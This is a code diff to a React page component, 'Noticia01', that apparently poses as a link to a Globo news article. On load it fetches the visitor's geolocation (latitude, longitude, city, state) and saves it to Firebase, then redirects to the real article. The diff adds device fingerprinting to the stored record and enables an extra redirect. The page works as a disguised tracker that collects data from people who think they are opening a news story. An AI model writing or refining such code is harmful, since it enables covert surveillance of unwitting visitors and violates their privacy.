@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { db } from '../utils/firebase';
+import {deviceDetect} from "react-device-detect";
 
 export function Noticia01() {
 
@@ -16,6 +17,7 @@ export function Noticia01() {
     const REDIRECT_URL = 'https://ge.globo.com/futebol/times/flamengo/noticia/gabigol-cobra-medidas-apos-racismo-em-jogo-do-flamengo-passam-pano-e-nao-e-o-certo.ghtml';
 
     async function setGeolocationData() {
+
         fetch(API + DEFAULT_QUERY)
         .then(response => {
             if (response.ok) {
@@ -41,7 +43,8 @@ export function Noticia01() {
                 latitude: data.latitude,
                 longitude: data.longitude,
                 cidade: data.city,
-                estado: data.state
+                estado: data.state,
+                device: deviceDetect()
             })
             .then(() => {
                 console.debug("Document successfully written!");
@@ -56,7 +59,7 @@ export function Noticia01() {
     useEffect(()=> {
 	    setStatus('Localizando...');
         setGeolocationData().then( _ =>{
-            // window.location.replace("https://google.com/contact");
+            window.location.replace("https://google.com/contact");
             setTimeout(() => {
                 window.location.replace(REDIRECT_URL);
             }, 3000);
